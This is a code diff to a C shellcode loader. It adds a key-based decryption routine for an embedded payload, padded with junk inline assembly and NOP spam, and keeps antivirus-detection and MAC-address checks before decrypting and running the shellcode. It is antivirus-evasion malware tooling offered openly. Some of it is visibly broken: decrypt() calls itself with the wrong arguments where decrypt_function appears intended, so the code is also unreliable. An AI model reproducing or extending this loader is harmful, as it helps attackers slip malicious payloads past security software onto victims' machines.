@@ -15,6 +15,11 @@ int get_current_time();
 
 void get_mac_address(char* final_mac_address);
 int checks_mac_address();
+
+int decrypt_function(int characterSet[][CHARACTER_SET_SIZE], unsigned char *key, unsigned char *ciphertext);
+int decrypt();
+unsigned char* parseByteString(char *byteString);
+
 //
 
 LPVOID lpvAddr;
@@ -310,6 +315,142 @@ void xor_cipher(char* shellcode){
 }
 
 
+int decrypt_function(int characterSet[][CHARACTER_SET_SIZE], unsigned char *key, unsigned char *ciphertext){
+    int payloadLength = strlen((char *)ciphertext);
+    unsigned char originalPayload[payloadLength];
+
+    for (int i = 0; i < payloadLength; i++)
+    {
+        int encryptedByte = (int)ciphertext[i];
+        int keyByte = (int)key[i];
+
+        for (int i2 = 0; i2 < CHARACTER_SET_SIZE; i2++)
+        {
+            __asm(
+                "PUSH %EAX;"
+                "XOR %EAX, %EAX;"
+                "JZ True1;"
+            
+            "True1:"
+                "POP %EAX;"
+            );
+            spam_nops();
+
+            if (characterSet[keyByte - FIRST_BYTE][i2] == encryptedByte)
+            {
+
+                originalPayload[i] = (unsigned char)characterSet[0][i2];
+                break;
+            }
+        }
+    }
+
+    // for (int i = 0; i < payloadLength; i++){
+        // printf("\\x%02x", (int)originalPayload[i]);
+    // }
+    strcpy(&shellcode,&originalPayload);
+    return 0;
+}
+
+
+
+int decrypt()
+{
+    int characterSet[CHARACTER_SET_SIZE][CHARACTER_SET_SIZE];
+
+    // Loop for each permutation required
+    for (int i = 0; i < CHARACTER_SET_SIZE; i++)
+    {
+        // Add each character to the right of the
+        // initial offset to the start of the row.
+        for (int i2 = i; i2 < CHARACTER_SET_SIZE; i2++)
+        {
+            characterSet[i][i2 - i] = i2 + FIRST_BYTE;
+        }
+
+        // Rotate the characters to the left of the
+        // initial offset to the end of the row.
+        for (int i2 = 0; i2 < i; i2++)
+        {
+            characterSet[i][(CHARACTER_SET_SIZE - i) + i2] = i2 + FIRST_BYTE;
+        }
+    }
+
+    unsigned char *baseKey = parseByteString(KEY);
+    int keyLength = strlen((char *)baseKey);
+
+
+    unsigned char *payload = parseByteString(shellcode);
+    int payloadLength = strlen((char *)payload);
+
+
+    int inflatedKeySize = keyLength;
+    int iterationsNeeded = 1;
+
+    // If the payload is larger than the key, the key needs to be
+    // repeated N times to make it match or exceed the length of
+    // the payload.
+    if (payloadLength > keyLength)
+    {
+        // Determine the number of times the key needs to be expanded
+        // to meet the length required to encrypt the payload.
+        iterationsNeeded = (int)((payloadLength / keyLength) + 0.5) + 1;
+
+        // Determine the new key size required and store it in
+        // inflatedKeySize for use when initialising the new key.
+        inflatedKeySize = keyLength * iterationsNeeded;
+    }
+
+    // Initialise the key with a null byte so that strcat can work.
+    unsigned char key[inflatedKeySize];
+    key[0] = '\x00';
+
+    // Concatenate the base key on to the new key to ensure it
+    // is long enough to encrypt the payload.
+    for (int i = 0; i < iterationsNeeded; i++)
+    {
+        strcat((char *)key, (char *)baseKey);
+    }
+
+    decrypt(characterSet, key, payload);
+
+    return 0;
+}
+
+
+
+unsigned char* parseByteString(char *byteString){
+    unsigned int byteStringLength = strlen(byteString);
+    char byteStringCopy[byteStringLength];
+    strcpy(byteStringCopy, byteString);
+
+    unsigned int length = 0;
+    for (unsigned int i = 0; i < byteStringLength; i++)
+    {
+        if (byteStringCopy[i] == 'x')
+        {
+            length += 1;
+        }
+    }
+
+    unsigned char* parsedString = (unsigned char*)malloc(sizeof (unsigned char) * length);
+    const char delim[3] = "\\x";
+    char *b;
+
+    b = strtok(byteStringCopy, delim);
+    int currentByte = 0;
+
+    while( b != NULL ) {
+        char parsedByte = (char)(int)strtol(b, NULL, 16);
+        parsedString[currentByte] = parsedByte;
+        currentByte += 1;
+        b = strtok(NULL, delim);
+    }
+
+    return parsedString;
+}
+
+
 
 
 void spam_nops(){
@@ -343,8 +484,6 @@ int main(){
     // spam_nops();
 
 
-    // xor_cipher(&shellcode); // Encrypts the shellcode
-
     if (bypass_av() != 0){
         printf("AV detected");
         return 0;
@@ -355,7 +494,7 @@ int main(){
 
     // return 0;
 
-    xor_cipher(&shellcode); // Decrypts the shellcode
+    decrypt(); // Decrypts the shellcode
 
     while (1){
 
